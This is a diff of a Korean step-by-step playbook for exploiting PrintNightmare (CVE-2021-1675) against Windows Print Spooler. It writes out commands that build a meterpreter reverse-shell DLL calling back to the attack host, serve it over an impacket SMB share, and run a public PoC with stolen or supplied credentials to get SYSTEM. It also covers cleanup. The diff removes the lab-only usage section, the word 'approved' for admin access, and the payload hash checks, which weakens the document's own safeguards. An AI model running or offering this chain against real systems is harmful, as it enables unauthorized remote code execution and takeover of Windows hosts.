@@ -13,11 +13,7 @@ tags:
 
 공격 호스트에서 대상 Windows의 SMB와 Print Spooler 원격 프로시저 호출 인터페이스에 연결할 수 있고 PoC에 필요한 Windows 계정이 있다면, 패치 상태를 확인한 뒤 원격 DLL 로드와 대상 호스트의 SYSTEM 코드 실행을 단계별로 검증한다.
 
-## 사용할 때
-
-- 패치되지 않은 Windows 실습 대상에서 Print Spooler RPC가 노출되었을 때.
-- PoC와 종속 Impacket 버전을 격리된 재현 환경에 고정할 수 있을 때.
-- Spooler 중단 가능성과 DLL·driver 흔적을 확인했을 때.
+> Print Spooler 중단, driver·DLL 잔존, printer job 손실 또는 재부팅이 발생할 수 있다. 대상의 exact driver와 복사된 DLL을 다시 식별할 수 없으면 전체 복구 완료로 표시하지 않는다.
 
 ## 전제 조건
 
@@ -45,7 +41,7 @@ rpcdump.py @<TARGET> | egrep 'MS-RPRN|MS-PAR'
 
 실행할 정확한 PoC source에서 `pName`, driver environment와 payload 복사 경로 생성 방식을 먼저 확인한다. 이 문서가 검토한 cube0x0 Python PoC는 driver 이름 `1234`, `Windows x64`와 `%SystemRoot%\System32\spool\drivers\x64\3\old\<N>\<PAYLOAD_FILE_NAME>` 후보를 사용하지만 fork·버전마다 같다고 가정하지 않는다. 아래 `<POC_DRIVER_NAME>`은 실제 source에서 확인한 값이다.
 
-대상의 승인된 관리자 PowerShell에서 작업 전 Spooler와 driver, 같은 이름의 payload 파일을 기록한다. 같은 driver 이름이나 payload 경로가 이미 있으면 덮어쓰지 않고 PoC 실행을 중단한다.
+대상 관리자 PowerShell에서 작업 전 Spooler와 driver, 같은 이름의 payload 파일을 기록한다. 같은 driver 이름이나 payload 경로가 이미 있으면 덮어쓰지 않고 PoC 실행을 중단한다.
 
 ```powershell
 Get-Service Spooler | Select-Object Name,Status,StartType
@@ -66,7 +62,6 @@ sudo ss -ltnp 'sport = :445'
 test ! -e '<PRINTNIGHTMARE_RUN_DIRECTORY>'
 mkdir -m 700 -- '<PRINTNIGHTMARE_RUN_DIRECTORY>'
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACK_HOST> LPORT=<LISTEN_PORT> -f dll -o '<PRINTNIGHTMARE_RUN_DIRECTORY>/<PAYLOAD_FILE_NAME>'
-sha256sum -- '<PRINTNIGHTMARE_RUN_DIRECTORY>/<PAYLOAD_FILE_NAME>'
 sudo impacket-smbserver <SHARE> '<PRINTNIGHTMARE_RUN_DIRECTORY>' -smb2support
 ```
 
@@ -95,7 +90,7 @@ sudo python3 CVE-2021-1675.py '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '\\<ATTACK_H
 
 - `Bind OK`, `pDriverPath Found`, `Executing ... payload.dll`.
 - listener에 새 `<SESSION_ID>`가 열리고 대상에서 `whoami`가 `nt authority\system`.
-- callback 뒤 대상 관리자 PowerShell에서 `<POC_DRIVER_NAME>`과 작업 전 없던 `<PAYLOAD_FILE_NAME>`의 exact 복사 경로·hash를 확인해 `<COPIED_PAYLOAD_PATH>`로 기록한다. PoC retry 때문에 한 경로보다 많을 수 있다.
+- callback 뒤 대상 관리자 PowerShell에서 `<POC_DRIVER_NAME>`과 작업 전 없던 `<PAYLOAD_FILE_NAME>`의 exact 복사 경로를 `<COPIED_PAYLOAD_PATH>`로 기록한다. PoC retry 때문에 한 경로보다 많을 수 있다.
 
 ## 관찰과 상태 전환
 
@@ -125,13 +120,12 @@ $CreatedDriver = Get-PrinterDriver -Name '<POC_DRIVER_NAME>' -ErrorAction Silent
 $CreatedDriver | Select-Object Name,PrinterEnvironment,InfPath,ConfigFile,DataFile
 if ($null -ne $CreatedDriver) { Remove-PrinterDriver -Name '<POC_DRIVER_NAME>' -Confirm:$false }
 Get-PrinterDriver -Name '<POC_DRIVER_NAME>' -ErrorAction SilentlyContinue
-Get-FileHash -LiteralPath '<COPIED_PAYLOAD_PATH>' -Algorithm SHA256
 Remove-Item -LiteralPath '<COPIED_PAYLOAD_PATH>' -Force
 Test-Path -LiteralPath '<COPIED_PAYLOAD_PATH>'
 Get-Service Spooler | Select-Object Name,Status,StartType
 ```
 
-driver 조회가 비고 각 exact payload path의 `Test-Path`가 `False`여야 한다. copied DLL hash는 공격 호스트 원본과 일치하고 작업 전 목록에 없던 경로일 때만 제거한다. 여러 retry path가 있으면 확인된 각 `<COPIED_PAYLOAD_PATH>`에 같은 검증을 반복한다. driver가 사용 중이거나 path·hash를 확정할 수 없으면 이름 패턴으로 driver·`old` directory를 일괄 삭제하지 않고 `원격 복구 미확인`으로 남긴다.
+driver 조회가 비고 각 exact payload path의 `Test-Path`가 `False`여야 한다. 작업 전 목록에 없던 exact copied DLL path만 제거한다. 여러 retry path가 있으면 확인된 각 `<COPIED_PAYLOAD_PATH>`에 같은 검증을 반복한다. driver가 사용 중이거나 path를 확정할 수 없으면 이름 패턴으로 driver·`old` directory를 일괄 삭제하지 않고 `원격 복구 미확인`으로 남긴다.
 
 Spooler가 중단됐다면 작업 전 `Running`이었을 때만 `Start-Service Spooler`를 실행하고 다시 상태를 확인한다. crash·재부팅·printer job 손실과 Windows event/보안 로그는 원상복구할 수 없는 영향이며 driver·DLL 제거와 별도로 기록한다.
 
